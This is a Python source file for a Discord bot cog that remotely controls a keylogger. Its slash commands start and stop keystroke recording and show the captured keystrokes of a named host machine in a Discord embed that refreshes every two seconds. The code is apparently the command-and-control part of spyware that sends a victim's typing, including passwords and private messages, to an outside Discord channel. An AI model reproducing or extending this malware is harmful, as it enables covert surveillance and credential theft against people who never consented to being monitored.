import discord
from discord.ext import commands
from discord import app_commands
from utils import logger
import asyncio

class Record(commands.GroupCog):
    group_name = "keystroke"
    group_description = "commands"
    dm_permission = True

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="start", description="Start the recording")
    async def start(self, interaction: discord.Interaction):
        if not logger.get_keylog_state():
            logger.set_keylog_state(True)
            await interaction.response.send_message("Recording Started.", ephemeral=True)
        else:
            await interaction.response.send_message("Recording already running.", ephemeral=True)

    @app_commands.command(name="stop", description="Stop the recording")
    async def stop(self, interaction: discord.Interaction):
        if logger.get_keylog_state():
            logger.set_keylog_state(False)
            await interaction.response.send_message("Recording stopped.", ephemeral=True)
        else:
            await interaction.response.send_message("Recording is not running.", ephemeral=True)

    @app_commands.command(name="show", description="Show the records")
    async def show(self, interaction: discord.Interaction):
        embed = discord.Embed(
            colour=discord.Colour.green(),
            title=f"Keyboard Records of: {logger.hostname}",
            description=logger.get_log()
        )

        await interaction.response.send_message(embed=embed)
        msg = await interaction.original_response()
        while logger.get_keylog_state():
            await asyncio.sleep(2)
            new_embed = discord.Embed(
                colour=discord.Colour.green(),
                title=f"Keyboard Records of: {logger.hostname}",
                description=logger.get_log()
            )
            await msg.edit(embed=new_embed)

async def setup(bot: commands.Bot):
    await bot.add_cog(Record(bot))
